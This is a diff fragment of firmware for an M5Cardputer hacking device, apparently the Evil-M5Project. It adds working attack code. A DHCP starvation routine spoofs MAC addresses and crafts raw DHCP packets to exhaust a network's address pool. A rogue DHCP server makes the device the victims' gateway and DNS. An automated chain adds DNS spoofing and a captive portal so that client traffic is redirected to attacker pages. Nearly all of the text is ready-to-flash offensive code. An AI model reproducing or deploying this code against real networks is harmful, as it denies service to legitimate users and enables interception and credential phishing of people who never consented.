+        Serial.println("DHCP server detected. Starting DHCP Starvation attack...");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Starvation running on:");
+        M5.Display.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
+        M5.Display.display();
+    } else {
+        Serial.println("No DHCP server detected. Trying with broadcast.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Starvation running on:");
+        M5.Display.printf("Unknow DHCP server");
+        M5.Display.display();
+    }
+
+    uint16_t i = 0;
+    while (nakCount < NAKNumberStarvation) {
+        M5.update();
+        M5Cardputer.update();
+                
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+            Serial.println("Attack stopped by user");
+            M5.Display.println("Attack stopped");
+            M5.Display.display();
+            delay(1000);
+            break;
+        }
+
+        generateRandomMAC(macBase, i); // Generate random MAC address
+        completeDHCPTransaction(macBase); // Perform complete DHCP transaction
+
+        float progress = (float)ackCount / totalIPs;
+        percentage = (int)(progress * 100.0);
+       // Update display with statistics
+        M5.Display.fillRect(0, 40, M5.Display.width(), 40, menuBackgroundColor);
+        M5.Display.setCursor(0, 40);
+        M5.Display.printf("Pool percentage: %d%%\n", percentage);
+        M5.Display.printf("Send Discover: %d\n", discoverCount);
+        M5.Display.printf("Received Offer: %d\n", offerCount);
+        M5.Display.printf("Send Request: %d\n", requestCount);
+        M5.Display.printf("Received ACK: %d\n", ackCount);
+        M5.Display.printf("Received NAK: %d\n", nakCount);
+        M5.Display.print("Last IP:");
+        M5.Display.print(lastAssignedIP.toString().c_str());
+        M5.Display.print("        ");
+        M5.Display.display();
+        i++;
+    }
+    if (nakCount >= NAKNumberStarvation ){
+            Serial.println("The number of NAK suggest a successfull Starvation.");
+            M5.Display.clear(menuBackgroundColor);
+            M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+            M5.Display.setCursor(0, 30);
+            M5.Display.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");
+            M5.Display.display();
+            delay(4000);
+    }
+    Serial.println("DHCP Starvation attack completed.");
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 30);
+    M5.Display.println("DHCP Starvation Stopped.");
+    M5.Display.printf("Pool percentage: %d%%\n", percentage);
+    M5.Display.printf("Total Discover: %d\n", discoverCount);
+    M5.Display.printf("Total Offer: %d\n", offerCount);
+    M5.Display.printf("Total Request: %d\n", requestCount);
+    M5.Display.printf("Total ACK: %d\n", ackCount);
+    M5.Display.printf("Total NAK: %d\n", nakCount);
+    M5.Display.display();
+    delay(4000);
+    waitAndReturnToMenu("Return to menu");
+}
+
+const uint8_t knownOUI[][3] = {
+    {0x00, 0x1A, 0x2B}, // Cisco
+    {0x00, 0x1B, 0x63}, // Apple
+    {0x00, 0x1C, 0x4D}, // Intel
+    {0xAC, 0xDE, 0x48}, // Broadcom
+    {0xD8, 0x3C, 0x69}, // Huawei
+    {0x3C, 0xA0, 0x67}, // Samsung
+    {0xB4, 0x86, 0x55}, // Xiaomi
+    {0xF4, 0x28, 0x53}, // TP-Link
+    {0x00, 0x25, 0x9C}, // Dell
+    {0x00, 0x16, 0xEA}, // LG Electronics
+    {0x00, 0x1E, 0xC2}, // Sony
+    {0x50, 0xCC, 0xF8}, // Microsoft
+    {0x00, 0x24, 0xE8}, // ASUS
+    {0x88, 0x32, 0x9B}, // Hewlett Packard
+    {0x00, 0x26, 0xBB}, // Lenovo
+    {0x78, 0xD7, 0xF7}, // Realtek Semiconductor
+    {0xBC, 0x92, 0x6B}, // Xiaomi Communications
+    {0x84, 0xA8, 0xE4}, // OnePlus Technology
+    {0xD4, 0x25, 0x8B}, // Oppo Mobile
+    {0x8C, 0x5A, 0xF0}, // Amazon Technologies
+    {0xAC, 0x3C, 0x0B}, // Google
+    {0x00, 0x17, 0xF2}, // Philips Lighting
+    {0x00, 0x1D, 0x7E}, // Motorola
+    {0xF8, 0x16, 0x54}, // ZTE Corporation
+    {0xE8, 0x94, 0xF6}, // Vivo Mobile
+    {0xF4, 0x09, 0xD8}, // Netgear
+    {0x00, 0x0F, 0xB5}, // Buffalo
+    {0x40, 0x16, 0x7E}, // PlayStation
+    {0x68, 0x5B, 0x35}, // Nintendo
+    {0xF4, 0x6D, 0x04}, // Fitbit
+    {0x00, 0x1E, 0x3D}, // Blackberry
+    {0x24, 0xD4, 0x42}, // Razer
+    {0x4C, 0x32, 0x75}, // Logitech
+    {0x74, 0x83, 0xEF}, // Roku
+    {0x28, 0xA1, 0x83}, // Alienware (Dell)
+    {0xB8, 0x27, 0xEB}, // Raspberry Pi Foundation
+    {0x44, 0x65, 0x0D}, // Aruba Networks
+    {0x38, 0xFF, 0x36}, // Juniper Networks
+    {0x00, 0x23, 0x6C}  // Panasonic
+};
+
+void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
+    // Select random OUI
+    uint8_t index = random(0, sizeof(knownOUI) / sizeof(knownOUI[0]));
+    mac[0] = knownOUI[index][0];
+    mac[1] = knownOUI[index][1];
+    mac[2] = knownOUI[index][2];
+
+    // Generate last 3 bytes randomly
+    mac[3] = random(0x00, 0xFF);
+    mac[4] = random(0x00, 0xFF);
+    mac[5] = random(0x00, 0xFF);
+}
+
+char transactionHostname[64];
+
+// List of machine names
+const char *hostnames[] = {
+    "Evil-M5Project",
+    "EvilStarvation",
+    "Hackintosh",
+    "RouterMcRouteFace",
+    "NotAVirus",
+    "Cyberdyne101",
+    "R2Hack2",
+    "MatrixMode",
+    "QuantumRick",
+    "MordorLAN",
+    "SkynetNode",
+    "DeathStarHub",
+    "Voldemodem",
+    "SithRouter",
+    "TheGibson",
+    "TowelieAP",
+    "PickleLAN",
+    "PortalGun",
+    "NSA_Truck",
+    "OneDoesNotSimply",
+    "NeuralNet",
+    "WarGames",
+    "EvilMorty",
+    "FrodoLAN",
+    "HAL9000",
+    "Plumbus",
+    "BatSignlan",
+    "EvilIsNear",
+    "EvilComputer",
+    "EvilServer",
+    "EvilPrinter",
+    "EvilRouter",
+    "EvilHub",
+    "EvilNAS",
+    "EvilTV",
+    "EvilTVBOX",
+    "EvilPhone",
+};
+
+const char* getRandomHostname() {
+    uint8_t index = random(0, sizeof(hostnames) / sizeof(hostnames[0]));
+    return hostnames[index];
+}
+
+void sendDHCPDiscover(uint8_t *mac) {
+    uint8_t dhcpDiscover[300] = {0};
+    int index = 0;
+
+    // Ethernet Header
+    dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
+    dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
+    dhcpDiscover[index++] = 0x06; // HLEN: MAC address length
+    dhcpDiscover[index++] = 0x00; // HOPS: 0
+
+    // Transaction ID
+    uint32_t xid = random(1, 0xFFFFFFFF); // Ensure xid is not zero
+    dhcpDiscover[index++] = (xid >> 24) & 0xFF;
+    dhcpDiscover[index++] = (xid >> 16) & 0xFF;
+    dhcpDiscover[index++] = (xid >> 8) & 0xFF;
+    dhcpDiscover[index++] = xid & 0xFF;
+
+    // Seconds and Flags
+    dhcpDiscover[index++] = 0x00; // Seconds
+    dhcpDiscover[index++] = 0x00;
+    dhcpDiscover[index++] = 0x80; // Flags (Broadcast)
+    dhcpDiscover[index++] = 0x00;
+
+    // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
+    for (int i = 0; i < 16; i++) {
+        dhcpDiscover[index++] = 0x00;
+    }
+
+    // Client MAC Address (chaddr)
+    for (int i = 0; i < 6; i++) {
+        dhcpDiscover[index++] = mac[i];
+    }
+    for (int i = 0; i < 10; i++) {
+        dhcpDiscover[index++] = 0x00; // Padding to make chaddr 16 bytes
+    }
+
+    // sname: Server Host Name (64 bytes)
+    for (int i = 0; i < 64; i++) {
+        dhcpDiscover[index++] = 0x00;
+    }
+
+    // file: Boot File Name (128 bytes)
+    for (int i = 0; i < 128; i++) {
+        dhcpDiscover[index++] = 0x00;
+    }
+
+    // DHCP Magic Cookie
+    dhcpDiscover[index++] = 0x63;
+    dhcpDiscover[index++] = 0x82;
+    dhcpDiscover[index++] = 0x53;
+    dhcpDiscover[index++] = 0x63;
+
+    // DHCP Options
+    dhcpDiscover[index++] = 53; // DHCP Message Type Option
+    dhcpDiscover[index++] = 1;  // Length
+    dhcpDiscover[index++] = 1;  // DHCP Discover
+
+    // Host Name Option (12)
+    const char* hostname = getRandomHostname();
+    strncpy(transactionHostname, hostname, sizeof(transactionHostname) - 1); // Store hostname for transaction
+    transactionHostname[sizeof(transactionHostname) - 1] = '\0'; // Ensure null termination
+
+    dhcpDiscover[index++] = 12;               // Option 12: Host Name
+    dhcpDiscover[index++] = strlen(transactionHostname); // Length of the host name
+    for (size_t i = 0; i < strlen(transactionHostname); i++) {
+        dhcpDiscover[index++] = transactionHostname[i];  // Add the host name characters
+    }
+
+    dhcpDiscover[index++] = 55; // Parameter Request List
+    dhcpDiscover[index++] = 4;  // Length
+    dhcpDiscover[index++] = 1;  // Subnet Mask
+    dhcpDiscover[index++] = 3;  // Router
+    dhcpDiscover[index++] = 6;  // DNS Server
+    dhcpDiscover[index++] = 15; // Domain Name
+    dhcpDiscover[index++] = 255; // End Option
+
+    // Send the packet
+    if (udp.beginPacket(broadcastIP, 67)) {
+        udp.write(dhcpDiscover, index);
+        udp.endPacket();
+        discoverCount++;
+        Serial.println("Sent DHCP Discover with Host Name...");
+        Serial.printf("Host Name: %s\n", transactionHostname);
+    } else {
+        Serial.println("Failed to send DHCP Discover.");
+        M5.Display.setCursor(0, M5.Display.height() - 40);
+        M5.Display.println("Failed to send DHCP Discover");
+        M5.Display.display();
+    }
+}
+
+void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
+    uint8_t dhcpRequest[300] = {0};
+    int index = 0;
+
+    // Ethernet Header
+    dhcpRequest[index++] = 0x01; // OP: BOOTREQUEST
+    dhcpRequest[index++] = 0x01; // HTYPE: Ethernet
+    dhcpRequest[index++] = 0x06; // HLEN: MAC address length
+    dhcpRequest[index++] = 0x00; // HOPS: 0
+
+    // Transaction ID
+    uint32_t xid = random(1, 0xFFFFFFFF); // Unique transaction ID
+    dhcpRequest[index++] = (xid >> 24) & 0xFF;
+    dhcpRequest[index++] = (xid >> 16) & 0xFF;
+    dhcpRequest[index++] = (xid >> 8) & 0xFF;
+    dhcpRequest[index++] = xid & 0xFF;
+
+    // Seconds and Flags
+    dhcpRequest[index++] = 0x00; // Seconds
+    dhcpRequest[index++] = 0x00;
+    dhcpRequest[index++] = 0x80; // Flags (Broadcast)
+    dhcpRequest[index++] = 0x00;
+
+    // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
+    for (int i = 0; i < 16; i++) {
+        dhcpRequest[index++] = 0x00;
+    }
+
+    // Client MAC Address (chaddr)
+    for (int i = 0; i < 6; i++) {
+        dhcpRequest[index++] = mac[i];
+    }
+    for (int i = 0; i < 10; i++) {
+        dhcpRequest[index++] = 0x00; // Padding to make chaddr 16 bytes
+    }
+
+    // sname: Server Host Name (64 bytes)
+    for (int i = 0; i < 64; i++) {
+        dhcpRequest[index++] = 0x00;
+    }
+
+    // file: Boot File Name (128 bytes)
+    for (int i = 0; i < 128; i++) {
+        dhcpRequest[index++] = 0x00;
+    }
+
+    // DHCP Magic Cookie
+    dhcpRequest[index++] = 0x63;
+    dhcpRequest[index++] = 0x82;
+    dhcpRequest[index++] = 0x53;
+    dhcpRequest[index++] = 0x63;
+
+    // DHCP Options
+    dhcpRequest[index++] = 53; // DHCP Message Type Option
+    dhcpRequest[index++] = 1;  // Length
+    dhcpRequest[index++] = 3;  // DHCP Request
+
+    // Requested IP Address Option
+    dhcpRequest[index++] = 50; // Requested IP Address
+    dhcpRequest[index++] = 4;  // Length
+    dhcpRequest[index++] = offeredIP[0];
+    dhcpRequest[index++] = offeredIP[1];
+    dhcpRequest[index++] = offeredIP[2];
+    dhcpRequest[index++] = offeredIP[3];
+
+    // DHCP Server Identifier Option
+    dhcpRequest[index++] = 54; // DHCP Server Identifier
+    dhcpRequest[index++] = 4;  // Length
+    dhcpRequest[index++] = dhcpServerIP[0];
+    dhcpRequest[index++] = dhcpServerIP[1];
+    dhcpRequest[index++] = dhcpServerIP[2];
+    dhcpRequest[index++] = dhcpServerIP[3];
+
+    // Host Name Option (12)
+    dhcpRequest[index++] = 12;               // Option 12: Host Name
+    dhcpRequest[index++] = strlen(transactionHostname); // Length of the host name
+    for (size_t i = 0; i < strlen(transactionHostname); i++) {
+        dhcpRequest[index++] = transactionHostname[i];  // Add the host name characters
+    }
+
+    dhcpRequest[index++] = 255; // End Option
+
+    // Send the packet
+    if (udp.beginPacket(broadcastIP, 67)) {
+        udp.write(dhcpRequest, index);
+        udp.endPacket();
+        requestCount++;
+        Serial.println("Sent DHCP Request with Host Name...");
+        Serial.printf("Host Name: %s\n", transactionHostname);
+    } else {
+        Serial.println("Failed to send DHCP Request.");
+        M5.Display.setCursor(0, M5.Display.height() - 40);
+        M5.Display.println("Failed to send DHCP Request");
+        M5.Display.display();
+    }
+}
+
+// Complete DHCP Transaction
+void completeDHCPTransaction(uint8_t *mac) {
+    sendDHCPDiscover(mac);
+    Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");
+
+    unsigned long offerWaitStart = millis();
+    while (millis() - offerWaitStart < 2000) {
+        int packetSize = udp.parsePacket();
+        if (packetSize > 0) {
+            uint8_t packetBuffer[512];
+            udp.read(packetBuffer, packetSize);
+
+            uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
+            if (messageType == 6) { // DHCP NAK
+                nakCount++;
+                Serial.println("Received DHCP NAK");
+                return;
+          } else if (messageType == 2) { // DHCP Offer
+                offerCount++;
+                IPAddress offeredIP(packetBuffer[16], packetBuffer[17], packetBuffer[18], packetBuffer[19]);
+                Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
+                lastAssignedIP = offeredIP;
+
+                sendDHCPRequest(mac, offeredIP, dhcpServerIP);
+
+                unsigned long ackWaitStart = millis();
+                while (millis() - ackWaitStart < 2000) {
+                    int ackPacketSize = udp.parsePacket();
+                    if (ackPacketSize > 0) {
+                        udp.read(packetBuffer, ackPacketSize);
+
+                        uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackPacketSize);
+                        if (ackMessageType == 5) { // DHCP ACK
+                            ackCount++;
+                            Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
+                            return;
+                        } else if (ackMessageType == 6) { // DHCP NAK
+                            nakCount++;
+                            Serial.println("Received DHCP NAK");
+                            return;
+                        }
+                    }
+                }
+                Serial.println("No DHCP ACK received.");
+                return;
+            }
+        }
+    }
+    Serial.println("No DHCP Offer received.");
+}
+
+// DHCP packet analysis
+uint8_t parseDHCPMessageType(uint8_t *packet, int packetSize) {
+    if (packetSize < 244 || packet[236] != 0x63 || packet[237] != 0x82 || packet[238] != 0x53 || packet[239] != 0x63) {
+        return 0; // Not a DHCP packet
+    }
+    for (int i = 240; i < packetSize; i++) {
+        if (packet[i] == 53 && packet[i + 1] == 1) {
+            return packet[i + 2];
+        }
+    }
+    return 0;
+}
+
+void switchDNS() {
+  ipAP = WiFi.softAPIP();
+  ipSTA = WiFi.localIP();
+  dnsServer.stop();  // Stop the current DNS server
+  useAP = !useAP;    // Toggle between AP and STA modes
+  IPAddress newIP = useAP ? ipAP : ipSTA;
+  dnsServer.start(DNS_PORT, "*", newIP);  // Restart the DNS server with the new IP
+  Serial.print("DNS restarted with IP: ");
+  Serial.println(newIP);
+
+  // Build the message with the current DNS IP
+  String message = "DNS reset, new IP: " + newIP.toString();
+  waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
+}
+
+
+void rogueDHCPAuto() {
+  rogueIPRogue = WiFi.localIP();
+  currentSubnetRogue = WiFi.subnetMask();
+  currentGatewayRogue = WiFi.localIP();
+  currentDNSRogue = WiFi.localIP();
+
+  udp.begin(localUdpPort);
+
+  M5.Display.clear(menuBackgroundColor);
+  Serial.println("Rogue DHCP running...");
+  updateDisplay("DHCP running...");
+
+  unsigned long startTime = millis(); // Enregistrer le temps de début
+
+  while (millis() - startTime < 15000) { // Boucle pendant 15 secondes
+    M5.update();
+    M5Cardputer.update();
+    handleDnsRequestSerial();
+
+    int packetSizeRogue = udp.parsePacket();
+    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
+      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
+      updateDisplay("Packet received");
+
+      uint8_t packetBufferRogue[512];
+      udp.read(packetBufferRogue, packetSizeRogue);
+
+      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
+
+      if (messageTypeRogue == 1) { // DHCP Discover
+        Serial.println("DHCP Discover received. Preparing Offer...");
+        updateDisplay("Discover. Preparing Offer...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
+
+        // Send the DHCP Offer
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP Offer sent.");
+        updateDisplay("Offer sent.");
+
+      } else if (messageTypeRogue == 3) { // DHCP Request
+        Serial.println("DHCP Request received. Preparing ACK...");
+        updateDisplay("Request. Preparing ACK...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
+
+        // Send the DHCP ACK
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP ACK sent.");
+        updateDisplay("ACK sent.");
+      }
+    }
+  }
+  updateDisplay("Rogue DHCP stopped.");
+}
+
+
+void DHCPAttackAuto(){
+  bool DHCPDNSExplain = false;
+  if (confirmPopup("Some explanation ?")){
+    DHCPDNSExplain = true;
+  }
+  if (DHCPDNSExplain){
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 20);
+    M5.Display.println("Step 1 : DHCP Starvation.");
+    M5.Display.println("Send multiple fake new");
+    M5.Display.println("client to saturate the");
+    M5.Display.println("the pool of available");
+    M5.Display.println("IP address that DHCP can"); 
+    M5.Display.println("provide. NAK = Starvation");
+    M5.Display.println("Press Enter to start");
+    M5.Display.display();
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
+      M5.update();
+      M5Cardputer.update();
+      delay(100);
+    }
+  }
+  startDHCPStarvation();
+  enterDebounce();
+  if (DHCPDNSExplain){
+      M5.Display.clear(menuBackgroundColor);
+      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+      M5.Display.setCursor(0, 20);
+      M5.Display.println("Step 2 : Rogue DHCP.");
+      M5.Display.println("The Original DHCP cant");
+      M5.Display.println("provide new IP so we");
+      M5.Display.println("now answering any DHCP");
+      M5.Display.println("request with hijacked");
+      M5.Display.println("DNS that at evil IP.");
+      M5.Display.println("Press Enter to start");
+      M5.Display.display();
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
+      M5.update();
+      M5Cardputer.update();
+      delay(100);
+    }
+  }
+  rogueDHCPAuto();
+  enterDebounce();
+  if (DHCPDNSExplain){
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 20);
+    M5.Display.println("Step 3 : Start the Web");
+    M5.Display.println("server with DNS Spoofing.");
+    M5.Display.println("Start the portal to");
+    M5.Display.println("provide page and DNS.");
+    M5.Display.println("The DNS spoof any request");
+    M5.Display.println("to redirect to the evil.");
+    M5.Display.println("Press Enter to start");
+    M5.Display.display();
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
+      M5.update();
+      M5Cardputer.update();
+      delay(100);
+    }
+  }
+  createCaptivePortal();
+  enterDebounce();
+  if (DHCPDNSExplain){
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 20);
+    M5.Display.println("Step 4 : Change DNS IP.");
+    M5.Display.println("Changing DNS IP with");
+    M5.Display.println("local IP address to");
+    M5.Display.println("provide Spoffed DNS query.");
+    M5.Display.println("Press Enter to change");
+    M5.Display.display();
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
+      M5.update();
+      M5Cardputer.update();
+      delay(100);
+    }
+  }
+  switchDNS();
 }
